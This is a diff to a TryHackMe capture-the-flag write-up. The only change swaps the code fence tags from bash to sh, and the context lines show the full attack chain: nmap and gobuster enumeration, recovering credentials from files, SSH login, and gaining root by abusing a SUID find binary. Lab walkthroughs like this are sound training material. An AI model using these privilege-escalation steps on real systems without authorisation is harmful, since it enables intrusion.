@@ -17,7 +17,7 @@ categories: [THM, medium]
 Let's start scaning the machine with nmap.
 Like we can see in the scan, it returns, 4 open ports.
 
-```bash
+```sh
 nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
 ```
 
@@ -25,7 +25,7 @@ nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
 
 We're going to try to connect to ftp with the anonymous user.
 
-```bash
+```sh
 ftp <ip>
 ```
 
@@ -44,7 +44,7 @@ Inside FTP we can see the file called **.info.txt**, so we download it.
 
 Let's see what is the content of the file. It returns a phrase, and It seems to be in ROT13.
 
-```bash
+```sh
 cat .info.txt
 ```
 
@@ -73,7 +73,7 @@ And if we go to the standard http port, we find an apache2 default page.
 
 Time to find out directories using [Gobuster].
 
-```bash
+```sh
 gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t <threads> -x <extensions>
 ```
 
@@ -91,7 +91,7 @@ It returned more weird characters, so possibly is base64.
 
 When base64 is decoded, a md5 hash is revealed.
 
-```bash
+```sh
 echo "<base64 code>" | base64 -d
 ```
 
@@ -115,7 +115,7 @@ Like in the file **.info.txt** said, let's keep enumerating.
 
 This time, we will use the **common.txt** wordlist.
 
-```bash
+```sh
 gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -q -t <threads> -x <extensions>
 ```
 
@@ -148,13 +148,13 @@ Now is time to see the content of the file, and we got the credentials of the us
 
 It's time to connect to the machine with the credentials we got.
 
-```bash
+```sh
 ssh basterd@<IP> -p 55007
 ```
 
 When We're in, we can upgrade our simple shell to an interactive shell with the following command:
 
-```bash
+```sh
 python -c "import pty;pty.spawn('<shell>')"
 ```
 
@@ -162,13 +162,13 @@ python -c "import pty;pty.spawn('<shell>')"
 
 Let's show directory content and we can find a file called **backup.sh**.
 
-```bash
+```sh
 ls -la
 ```
 
 If we see the content, we can find another user named stoner and his password.
 
-```bash
+```sh
 cat backup.sh | more
 ```
 
@@ -180,7 +180,7 @@ cat backup.sh | more
 
 Time to log in with stoner.
 
-```bash
+```sh
 su stoner
 ```
 
@@ -188,7 +188,7 @@ su stoner
 
 If we go to his home directory, we find a **.secret** which contains the user flag.
 
-```bash
+```sh
 cd /home/stoner
 ls -la
 cat .secret
@@ -202,7 +202,7 @@ cat .secret
 
 It's time to elevate our privileges so If we search for suid binaries we can see the **find** binary.
 
-```bash
+```sh
 find / -perm /4000 -type f 2>/dev/null
 ```
 
@@ -210,7 +210,7 @@ find / -perm /4000 -type f 2>/dev/null
 
 We can use these permissions to elevate our privileges. If we don't know how to do this, we can search it in [GTFOBins].
 
-```bash
+```sh
 /usr/bin/find . -exec <shell> -p \; -quit
 ```
 
@@ -222,7 +222,7 @@ We can use these permissions to elevate our privileges. If we don't know how to 
 
 Being root, now we can go to root directory and show the root flag.
 
-```bash
+```sh
 cd /root
 ls -la
 cat root.txt
